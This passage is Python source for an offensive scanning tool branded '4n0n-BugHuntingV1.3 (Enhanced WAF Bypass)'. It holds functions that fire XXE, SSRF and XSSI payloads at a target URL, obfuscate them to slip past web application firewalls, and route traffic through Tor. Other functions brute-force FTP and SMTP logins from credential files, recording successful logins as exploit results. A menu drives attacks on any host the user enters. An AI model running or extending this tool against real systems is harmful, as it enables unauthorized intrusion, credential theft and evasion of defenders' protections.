                result = (payload, f"{Fore.GREEN}Vulnerable (Data Exposed){Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("Insecure Data Storage", url, payload, result[1], response)
        generate_html_report("Insecure Data Storage", url, payload, result[1])
    print_results(results)

def xxe_scan(url, payloads):
    battery_animation(f"Scanning XXE {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "XXE") if waf_detected else payload
            headers = {"Content-Type": "application/xml"}
            response = make_stealthy_request(url, method="POST", data=obfuscated_payload, headers=headers, scan_type="XXE")
            
            if response and ("root:" in response.text or "XXE" in response.text or "file://" in response.text):
                result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("XXE", url, payload, result[1], response)
        generate_html_report("XXE", url, payload, result[1])
    print_results(results)

def ssrf_scan(url, payloads):
    battery_animation(f"Scanning SSRF {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "SSRF") if waf_detected else payload
            response = make_stealthy_request(url, params={"url": obfuscated_payload}, scan_type="SSRF")
            
            if response and ("localhost" in response.text or "internal" in response.text or "127.0.0.1" in response.text):
                result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("SSRF", url, payload, result[1], response)
        generate_html_report("SSRF", url, payload, result[1])
    print_results(results)

def xssi_scan(url, payloads):
    battery_animation(f"Scanning XSSI {url}", 1)
    results = []
    waf_detected = check_waf_protection(url)
    if waf_detected:
        print(Fore.YELLOW + "[WARNING] WAF detected - Applying advanced bypass techniques")
        sys.waf_detected = True
    
    for payload in payloads:
        try:
            obfuscated_payload = obfuscate_payload(payload, "XSSI") if waf_detected else payload
            response = make_stealthy_request(url, params={"callback": obfuscated_payload}, scan_type="XSSI")
            
            if response and ("secret" in response.text or "token" in response.text or "api_key" in response.text):
                result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            else:
                result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("XSSI", url, payload, result[1], response)
        generate_html_report("XSSI", url, payload, result[1])
    print_results(results)

def ftp_scan(host, port, payloads):
    battery_animation(f"Scanning FTP {host}:{port}", 1)
    results = []
    for payload in payloads:
        try:
            username, password = payload.split(":")
            ftp = FTP()
            
            # Obfuscate credentials
            username = bypass_waf(username, "FTP")
            password = bypass_waf(password, "FTP")
            
            ftp.connect(host, int(port), timeout=REQUEST_TIMEOUT)
            ftp.login(username, password)
            
            result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            ftp.quit()
            exploit_result = f"FTP login successful with {username}:{password}"
            save_cve_log("FTP", f"{host}:{port}", payload, exploit_result)
        except error_perm as e:
            result = (payload, f"{Fore.RED}Not Vulnerable: {e}{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("FTP", f"{host}:{port}", payload, result[1], None)
        generate_html_report("FTP", f"{host}:{port}", payload, result[1])
    print_results(results)

def smtp_scan(host, port, payloads):
    battery_animation(f"Scanning SMTP {host}:{port}", 1)
    results = []
    for payload in payloads:
        try:
            username, password = payload.split(":")
            
            # Obfuscate credentials
            username = bypass_waf(username, "SMTP")
            password = bypass_waf(password, "SMTP")
            
            server = smtplib.SMTP(host, int(port), timeout=REQUEST_TIMEOUT)
            server.login(username, password)
            
            result = (payload, f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}")
            server.quit()
            exploit_result = f"SMTP login successful with {username}:{password}"
            save_cve_log("SMTP", f"{host}:{port}", payload, exploit_result)
        except smtplib.SMTPAuthenticationError:
            result = (payload, f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("SMTP", f"{host}:{port}", payload, result[1], None)
        generate_html_report("SMTP", f"{host}:{port}", payload, result[1])
    print_results(results)

def dns_scan(domain, payloads):
    battery_animation(f"Scanning DNS {domain}", 1)
    results = []
    for payload in payloads:
        try:
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(domain, payload)
            
            result = (payload, f"{Fore.GREEN}Vulnerable (Records Found){Style.RESET_ALL}")
            exploit_result = "\n".join([str(r) for r in answers])
            save_cve_log("DNS", domain, payload, exploit_result)
        except dns.resolver.NoAnswer:
            result = (payload, f"{Fore.RED}No Records Found{Style.RESET_ALL}")
        except Exception as e:
            result = (payload, f"{Fore.RED}Error: {e}")
        
        results.append(result)
        save_to_log("DNS", domain, payload, result[1], None)
        generate_html_report("DNS", domain, payload, result[1])
    print_results(results)

# --- Main Function ---
def main():
    show_banner()
    
    # Initialize Tor
    sys.using_tor = set_tor_proxy()
    if not sys.using_tor:
        proceed = input(Fore.YELLOW + "Tor connection failed. Continue without Tor? (y/n): " + Style.RESET_ALL)
        if proceed.lower() != 'y':
            typewriter_effect("Exiting the program. Goodbye!", color=Fore.YELLOW, delay=0.1)
            return
    
    while True:
        print("\n" + Fore.BLUE + "=== 4n0n-BugHuntingV1.3 (Enhanced WAF Bypass) ===" + Style.RESET_ALL)
        print("[1] SQL Injection")
        print("[2] SSH")
        print("[3] XSS")
        print("[4] CSRF")
        print("[5] RCE")
        print("[6] LFI")
        print("[7] Directory Traversal")
        print("[8] Session Hijacking")
        print("[9] Insecure Data Storage")
        print("[10] XXE")
        print("[11] SSRF")
        print("[12] XSSI")
        print("[13] FTP")
        print("[14] SMTP")
        print("[15] DNS")
        print("[16] Exit")
        
        choice = input(Fore.CYAN + "Enter option number: " + Style.RESET_ALL)
        
        if choice == '16':
            typewriter_effect("Exiting the program. Goodbye!", color=Fore.YELLOW, delay=0.1)
            break
            
        if choice not in [str(i) for i in range(1, 16)]:
            print("Invalid option. Please try again.")
            continue

        if choice in ['2', '13', '14']:  # Credential-based scans
            host = input("Enter host: ")
            port = input("Enter port: ")
            if not port.isdigit():
                print("Port must be a number.")
                continue
            file_path = input("Enter payload file path (credentials): ")
            payloads = read_payloads_from_file(file_path)
            if not payloads:
                continue
            if choice == '2':
                ssh_scan(host, port, payloads)
            elif choice == '13':
                ftp_scan(host, port, payloads)
            elif choice == '14':
                smtp_scan(host, port, payloads)
        elif choice == '15':
            domain = input("Enter domain: ")
            file_path = input("Enter payload file path (DNS query types): ")
            payloads = read_payloads_from_file(file_path)
            if not payloads:
                continue
            dns_scan(domain, payloads)
        else:
            url = input("Enter target URL: ")
            if not validate_url(url):
                print("Invalid URL. Make sure the URL starts with http:// or https://")
                continue
            file_path = input("Enter payload file path: ")
            payloads = read_payloads_from_file(file_path)
            if not payloads:
                continue
            if choice == '1':
                sql_injection(url, payloads)
            elif choice == '3':
                xss_scan(url, payloads)
            elif choice == '4':
                csrf_scan(url, payloads)
            elif choice == '5':
                rce_scan(url, payloads)
            elif choice == '6':
                lfi_scan(url, payloads)
            elif choice == '7':
                directory_traversal_scan(url, payloads)
            elif choice == '8':
                session_hijacking_scan(url, payloads)
            elif choice == '9':
                insecure_data_storage_scan(url, payloads)
            elif choice == '10':
                xxe_scan(url, payloads)
            elif choice == '11':
                ssrf_scan(url, payloads)
            elif choice == '12':
                xssi_scan(url, payloads)

        input(Fore.MAGENTA + "\nPress Enter to return to the main menu..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()

